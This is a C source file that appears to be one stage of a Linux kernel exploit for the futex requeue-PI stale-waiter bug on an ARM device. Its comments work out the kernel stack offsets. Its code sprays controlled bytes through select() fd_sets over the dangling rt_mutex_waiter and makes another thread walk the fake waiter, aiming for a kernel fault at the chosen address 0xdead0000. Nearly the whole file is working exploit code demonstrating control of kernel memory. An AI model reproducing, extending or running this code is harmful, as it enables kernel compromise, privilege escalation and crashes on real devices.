/*
 * gl_stack_probe.c - canary test for the stale rt_mutex_waiter on tank.
 *
 * After gl_trigger's deterministic -EDEADLK rollback, A->pi_blocked_on points
 * at the rt_waiter of A's futex_wait_requeue_pi frame. This probe tries to
 * overwrite that stack area with controlled bytes, park A inside the overwriting
 * syscall, then make B walk the stale pointer via FUTEX_LOCK_PI(Lx).
 *
 * Stack geometry (from the reproduced build, same GCC 4.8 / same config):
 *
 *   top = stack_base + 8192
 *   vector_swi        sp = top - 72            (S_FRAME_SIZE)
 *   SyS_futex         sp = top - 156           (push 40 + sub 44)
 *   do_futex          sp = top - 288           (push 40 + sub 92)
 *   futex_wait_requeue_pi: rt_waiter at sp - 104
 *                     => waiter at top - 392
 *
 *   SyS_select        sp = top - 140           (push 40 + sub 28)
 *   core_sys_select   stack_fds = fp - 300, fp = sp - 4
 *                     => stack_fds at top - 444
 *
 *   => the fake waiter starts at stack_fds + 52, its lock field at +96.
 *
 * select() copies nfds/8 bytes per set into the first three regions of
 * stack_fds, then blocks. With nfds=320 each set is 40 bytes, so the fake
 * waiter (52..99) spans the 'out' (40..79) and 'ex' (80..119) sets, both
 * fully controlled. The buffer is filled with 0xdead0000: the low 16 bits of
 * each word are zero, so fds 0..15 (stdio) are not selected, and the bits that
 * are set target duplicated pipe read ends (empty, not writable), so select
 * blocks. The fake waiter's lock word therefore stays 0xdead0000.
 *
 * Expected on success: kernel oops at virtual address 0xdead0000, in
 * rt_mutex_adjust_prio_chain / raw_spin_trylock, then panic_on_oops=1 reboot.
 * The bench's black box recovers the oops from /proc/last_kmsg.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef FUTEX_PRIVATE_FLAG
#define FUTEX_PRIVATE_FLAG 128
#endif

/* ARM EABI select. 82 is the obsolete sys_old_select (ENOSYS here); the
 * 5-argument entry is _newselect (142), which calls SyS_select and is the
 * frame we modelled. */
#ifndef __NR__newselect
#define __NR__newselect 142
#endif

#define SELECT_NFDS 320
#define SET_BYTES   (SELECT_NFDS / 8)   /* 40 */
#define CANARY      0xdead0000u

static int futex6(uint32_t *uaddr, int op, uint32_t val,
                  const struct timespec *to, uint32_t *uaddr2, uint32_t val3)
{
    return (int)syscall(__NR_futex, uaddr, op, val, to, uaddr2, val3);
}

static uint32_t rd32(const uint32_t *p)
{
    return *(volatile const uint32_t *)p;
}

static double now_s(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

static void msleep(int ms)
{
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

static void read_wchan(pid_t tid, char *buf, size_t len)
{
    char path[64];
    int fd;
    ssize_t n;

    buf[0] = 0;
    snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", (int)tid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return;
    n = read(fd, buf, len - 1);
    if (n > 0)
        buf[n] = 0;
    close(fd);
}

static int wchan_has(pid_t tid, const char *needle)
{
    char buf[128];
    read_wchan(tid, buf, sizeof(buf));
    return strstr(buf, needle) != NULL;
}

struct round {
    uint32_t lx;     /* PI lock owned by A */
    uint32_t l2;     /* PI lock owned by C */
    uint32_t uaddr1; /* non-PI futex A waits on */

    volatile int a_owns_lx;
    volatile int c_owns_l2;
    volatile int a_waiting;
    pid_t a_tid;
    pid_t c_tid;

    int c_lock_l2_ret, c_lock_l2_err;
    int c_lock_lx_ret, c_lock_lx_err;
    int a_ret, a_err;
    int b_ret, b_err;
    int b_lock_ret, b_lock_err;
    int sel_ret, sel_err;
    char a_wchan[128];
    char c_wchan[128];
};

static struct round R;

/* 320 valid, empty pipe read ends: fd 3..319. fds 0..2 are stdio. */
static int setup_pipes(void)
{
    struct rlimit rl;
    int p[2];
    int fd;

    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < SELECT_NFDS) {
        rl.rlim_cur = SELECT_NFDS;
        if (rl.rlim_max != RLIM_INFINITY && rl.rlim_cur > rl.rlim_max)
            rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    if (pipe(p) != 0) {
        printf("FAIL: pipe errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }

    /* Keep a write end alive above the fd range we are about to fill, otherwise
     * the read ends hit EOF and select() returns immediately instead of
     * parking. */
    if (fcntl(p[1], F_DUPFD, 512) < 0) {
        printf("FAIL: fcntl(F_DUPFD,512) errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }
    /* The original write end must not remain selected as a writable fd: close
     * it and let the loop replace it with a read end. */
    close(p[1]);

    for (fd = 3; fd < SELECT_NFDS; fd++) {
        if (fd == p[0])
            continue;
        if (dup2(p[0], fd) < 0) {
            printf("FAIL: dup2(%d,%d) errno=%d (%s)\n",
                   p[0], fd, errno, strerror(errno));
            return -1;
        }
    }
    /* p[0] and the dup'd write end stay open: read ends empty, no writer data. */
    return 0;
}

static void fill_canary(unsigned char sets[3][SET_BYTES])
{
    int s, i;
    for (s = 0; s < 3; s++) {
        for (i = 0; i < SET_BYTES; i += 4) {
            sets[s][i + 0] = (unsigned char)(CANARY & 0xff);
            sets[s][i + 1] = (unsigned char)((CANARY >> 8) & 0xff);
            sets[s][i + 2] = (unsigned char)((CANARY >> 16) & 0xff);
            sets[s][i + 3] = (unsigned char)((CANARY >> 24) & 0xff);
        }
    }
}

static void *thread_c(void *arg)
{
    (void)arg;
    R.c_tid = (pid_t)syscall(__NR_gettid);

    errno = 0;
    R.c_lock_l2_ret = futex6(&R.l2, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                             0, NULL, NULL, 0);
    R.c_lock_l2_err = errno;
    if (R.c_lock_l2_ret != 0)
        return NULL;
    R.c_owns_l2 = 1;

    while (!R.a_owns_lx)
        msleep(1);

    read_wchan(R.c_tid, R.c_wchan, sizeof(R.c_wchan));
    errno = 0;
    R.c_lock_lx_ret = futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                             0, NULL, NULL, 0);
    R.c_lock_lx_err = errno;

    /* Only reached if B did not fault: release whatever we own. */
    futex6(&R.lx, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    futex6(&R.l2, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    return NULL;
}

static void *thread_b(void *arg)
{
    (void)arg;
    double t0 = now_s();
    char wa[128] = "";
    char wc[128] = "";
    struct timespec deadline;
    int i;

    while (!R.a_waiting && now_s() - t0 < 1.0)
        msleep(1);

    for (i = 0; i < 300; i++) {
        int c_queued;
        read_wchan(R.a_tid, wa, sizeof(wa));
        read_wchan(R.c_tid, wc, sizeof(wc));
        c_queued = strstr(wc, "futex") || strstr(wc, "rt_mutex") ||
                   (rd32(&R.lx) & FUTEX_WAITERS);
        if (strstr(wa, "futex") && c_queued)
            break;
        msleep(1);
    }

    errno = 0;
    R.b_ret = futex6(&R.uaddr1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                     1, NULL, &R.l2, 0);
    R.b_err = errno;

    /* Wait until A is parked inside select(), with the canary on its stack. */
    for (i = 0; i < 300; i++) {
        read_wchan(R.a_tid, wa, sizeof(wa));
        if (strstr(wa, "select") || strstr(wa, "poll"))
            break;
        msleep(1);
    }
    snprintf(R.a_wchan, sizeof(R.a_wchan), "%s", wa);
    read_wchan(R.c_tid, wc, sizeof(wc));
    snprintf(R.c_wchan, sizeof(R.c_wchan), "%s", wc);

    /* 3s absolute deadline; if the fake waiter is not hit this returns. */
    clock_gettime(CLOCK_MONOTONIC, &deadline);
    deadline.tv_sec += 3;

    errno = 0;
    R.b_lock_ret = futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                          0, &deadline, NULL, 0);
    R.b_lock_err = errno;
    return NULL;
}

static int one_round(void)
{
    pthread_t tb, tc;
    struct timespec to;
    struct timeval tv;
    unsigned char sets[3][SET_BYTES];
    double t_end;
    int ok;

    memset(&R, 0, sizeof(R));
    fill_canary(sets);
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    if (setup_pipes() != 0) {
        printf("FAIL: setup_pipes errno=%d (%s)\n", errno, strerror(errno));
        return 2;
    }

    errno = 0;
    if (futex6(&R.lx, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
        printf("FAIL: A LOCK_PI(lx) errno=%d (%s)\n", errno, strerror(errno));
        return 2;
    }
    R.a_owns_lx = 1;
    R.a_tid = (pid_t)syscall(__NR_gettid);

    if (pthread_create(&tc, NULL, thread_c, NULL) != 0)
        return 2;
    while (!R.c_owns_l2)
        msleep(1);

    if (pthread_create(&tb, NULL, thread_b, NULL) != 0)
        return 2;

    clock_gettime(CLOCK_MONOTONIC, &to);
    to.tv_nsec += 300 * 1000 * 1000L;
    if (to.tv_nsec >= 1000000000L) {
        to.tv_sec++;
        to.tv_nsec -= 1000000000L;
    }

    R.a_waiting = 1;
    errno = 0;
    R.a_ret = futex6(&R.uaddr1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                     0, &to, &R.l2, 0);
    R.a_err = errno;

    /* FIRST syscall after the wait: fill the stale frame and park here.
     * No printf, no allocation, no libc call in between. */
    errno = 0;
    R.sel_ret = (int)syscall(__NR__newselect, SELECT_NFDS,
                             sets[0], sets[1], sets[2], &tv);
    R.sel_err = errno;

    /* If we are here, no oops happened. Cleanup and report. */
    futex6(&R.lx, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);

    t_end = now_s() + 5.0;
    pthread_join(tb, NULL);
    (void)t_end;
    pthread_join(tc, NULL);

    ok = (R.b_ret == -1 && R.b_err == EDEADLK) &&
         (R.b_lock_ret == -1 && R.b_lock_err == EDEADLK);

    printf("round: requeue=%d/%d wait=%d/%d select=%d/%d b_lock=%d/%d "
           "a_wchan='%s' c_wchan='%s' %s\n",
           R.b_ret, R.b_err, R.a_ret, R.a_err,
           R.sel_ret, R.sel_err, R.b_lock_ret, R.b_lock_err,
           R.a_wchan, R.c_wchan, ok ? "NO_CRASH" : "MISMATCH");
    return ok ? 0 : 3;
}

int main(int argc, char **argv)
{
    int rounds = 1;
    int ok = 0, bad = 0, i;

    if (argc > 1)
        rounds = atoi(argv[1]);
    if (rounds < 1)
        rounds = 1;

    for (i = 0; i < rounds; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            int rc = one_round();
            fflush(stdout);
            _exit(rc);
        }
        if (pid < 0)
            return 2;
        int st = 0;
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
            ok++;
        else
            bad++;
    }

    printf("RESULT ok=%d bad=%d rounds=%d\n", ok, bad, rounds);
    return bad == 0 ? 0 : 1;
}
